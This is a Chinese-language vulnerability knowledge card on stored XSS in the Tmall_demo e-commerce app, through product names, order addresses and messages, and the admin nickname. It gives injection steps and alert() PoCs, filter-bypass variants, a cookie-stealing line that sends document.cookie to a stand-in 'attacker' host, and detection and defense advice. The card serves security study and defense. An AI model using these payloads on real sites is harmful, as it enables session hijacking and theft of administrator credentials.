---
id: web-generic-xss-tmall-product-order-admin-nickname-stored
title: Tmall_demo 三处存储型 XSS：商品名称/标题、订单详细地址/卖家留言、管理员昵称未编码回显
type: scenario
domain: web
path: web/generic/xss
technique: tmall-multi-module-stored-xss
aliases:
- Tmall_demo XSS
- 天猫商城存储型 XSS
- 商品名称 XSS
- 商品标题 XSS
- 订单地址 XSS
- 卖家留言 XSS
- 管理员昵称 XSS
tags:
- xss
- stored-xss
- java
- spring
- e-commerce
- output-encoding
- tmall
cve: []
severity: high
confidence: medium
status: verified
created: '2026-11-07'
updated: '2026-11-07'
verification:
  verified_by: verifier-V240
  verified_at: '2026-11-07T10:34:20+08:00'
  notes: 对照原文 img/27-33：商品名称/标题（img/27-28）、订单详细地址/卖家留言（img/29-31，前台支付成功页与后台全部订单弹窗）、管理员昵称（img/32-33，重新登录 /tmall/admin 弹窗）三处存储型 XSS 均与图片一致；原文无后端过滤源码，卡内已标 confidence medium。与 xiahuia-erp-multi-module-stored 的产品/字段/触发页面差异成立（dedup body containment 0.457, verdict new）。原文无版本信息。
---

## 一句话结论

Tmall_demo 至少有三个业务字段把 `<script>` 原样保存并在页面回显：后台添加/编辑商品的“产品名称/产品标题”、前台下单的“详细地址/给卖家留言”、后台“我的账户”的管理员昵称；打开商品列表、前台支付成功页/后台全部订单、重新登录后台时分别触发脚本执行，形成跨前台与后台的存储型 XSS。

## 原理

- 存储型 XSS 的成立条件是“输入被持久化 + 输出未做上下文编码”。文章没有给出后端过滤/前端渲染源码，只通过界面操作证明三处字段都会保存 `<script>alert(n)</script>`，之后在列表/详情/账户页被原样拼进 HTML 并执行。
- 三处触发面：
  1. **商品名称/标题**：后台添加商品页的“产品名称”“产品标题”填入 `<script>alert(1)</script>`、`<script>alert(2)</script>` 后保存（图 27）；打开“所有产品”/按产品名称搜索时页面弹窗（图 28），说明商品列表把名称/标题直接作为 HTML 输出。该记录会出现在所有查看商品的后台用户浏览器中。
  2. **订单详细地址/卖家留言**：前台结算页 `GET /tmall/order/create/42?product_number=1` 的“详细地址”与“给卖家留言”填入 `<script>alert(1)</script>`、`<script>alert(2)</script>` 后提交（图 29）；支付成功页 `/tmall/order/pay/success/<订单号>` 弹窗（图 30），后台“全部订单”查看该订单时也弹窗（图 31），说明同一订单字段在前台成功页和后台订单列表/详情两处未编码输出。
  3. **管理员昵称**：后台“我的账户”里把“管理员昵称”改为 `<script>alert(1)</script>`（图 32）；重新登录进入 `/tmall/admin` 时弹窗（图 33），说明昵称被渲染在后台页面（如顶部账户区/账户页）且未编码。
- 为什么能跨模块：三个入口分别属于商品、订单、管理员资料三个业务域，但都缺少统一的输入过滤与输出编码层；后端只做字段长度/类型的基础校验，前端把数据直接插入 DOM。任何能看到这些记录的页面都会执行脚本，属于持久化、可重复触发的 XSS。
- 危害：商品/订单 XSS 会在管理员打开商品列表、订单列表时执行，可读取后台会话上下文、以管理员身份发起请求、篡改页面；管理员昵称 XSS 在重新登录后触发，目标就是管理员自身会话。文章只用 `alert()` 验证，未进一步利用。

## 触发条件

- 目标为 Tmall_demo，存在商品新增/编辑、前台下单、管理员账户资料三个功能。
- 对应字段未过滤 `<`、`>`、`"`、`'`，保存后在列表/详情/账户页直接拼进 HTML，页面无严格 CSP。
- 攻击者需要相应权限：商品字段需后台商品管理权限；订单字段需普通前台用户下单（订单随后被管理员查看）；管理员昵称需后台账户权限（或结合其它后台入口）。
- 受害者打开包含恶意记录的商品列表、订单列表/成功页，或管理员重新登录后台。

## 利用步骤

1. 登录后台，进入商品添加/编辑，产品名称填 `<script>alert(1)</script>`、产品标题填 `<script>alert(2)</script>`，保存后打开“所有产品”或按名称搜索，确认弹窗（可确定哪些字段被回显）。
2. 前台登录并下单，在“详细地址”填 `<script>alert(1)</script>`、“给卖家留言”填 `<script>alert(2)</script>`，提交订单；观察支付成功页是否弹窗，再让管理员打开“全部订单”/订单详情，确认后台也触发。
3. 后台“我的账户”把管理员昵称改为 `<script>alert(1)</script>`，退出后重新登录 `/tmall/admin`，确认后台页面弹窗。
4. 将 `alert()` 替换为窃取 Cookie/CSRF token 或发起后台操作的脚本（如 `new Image().src='http://attacker/?c='+document.cookie`），等待管理员打开对应页面。
5. 若目标有 CSP 或 Cookie 为 HttpOnly，改为利用页面内已有的 CSRF token 发起请求，或寻找可绕过的 DOM sink。

## PoC

```html
<script>alert(1)</script>
```

```html
<script>alert(2)</script>
```

```text
# 文章验证的注入位置：
# 1) 后台商品添加/编辑：产品名称、产品标题
#    保存后打开“所有产品”/搜索商品名称即弹窗
# 2) 前台下单：详细地址、给卖家留言
#    支付成功页 /tmall/order/pay/success/<订单号> 弹窗；
#    后台“全部订单”查看该订单也弹窗
# 3) 后台“我的账户”：管理员昵称
#    重新登录 /tmall/admin 后弹窗
```

## 变体与关联

- 变体：若后端过滤 `<script>`，可尝试 `<img src=x onerror=alert(1)>`、`<svg onload=alert(1)>`、大小写/双写/HTML 实体编码等；具体取决于过滤实现（原文未给出服务端过滤代码）。
- 变体：商品名称/标题可能同时出现在前台商品列表、详情页和后台列表，需分别确认上下文（HTML 文本、属性、JS 字符串）并调整闭合方式。
- 关联：[[web-generic-xss-xiahuia-erp-multi-module-stored]]（同为 Java 商城/ERP 多业务模块字段未编码的存储型 XSS，但该卡是华夏ERP V2.3 的采购商品、客户、供应商、收支项目等字段，产品与字段集合不同）；[[web-generic-xss-newbeemall-goods-detail-stored]]（商品详情存储型 XSS）；[[web-generic-xss-o2oa-rest-designer-mass-stored-xss]]（OA 多模块批量存储型 XSS）。
- 边界：文章只用 `alert()` 弹窗验证，未给出后端过滤/编码源码，也未测试 CSP/HttpOnly 环境；实际可利用性需按目标部署验证。

## 检测与防御

- 输入层：对商品名/标题、地址、留言、昵称等字段做长度与字符白名单，拒绝或转义 `<`、`>`、`"`、`'`、`&`；富文本使用白名单 sanitizer（如 OWASP Java HTML Sanitizer）。
- 输出层：按上下文做 HTML/属性/JS/URL 编码；前端避免 `innerHTML`/`html()` 直接插入用户数据，改用 `textContent` 或框架自动转义。
- 会话层：Cookie 设置 `HttpOnly`、`Secure`、`SameSite`；启用 CSP 限制内联脚本与外部脚本源。
- 检测：请求体/表单字段出现 `<script`、`onerror=`、`onload=`、`javascript:`；数据库中商品/订单/管理员字段出现 HTML 标签；管理员浏览器出现异常外连。
- 响应：发现存储型 XSS 后清理历史恶意记录，审计管理员会话是否被劫持，轮换会话与密码。
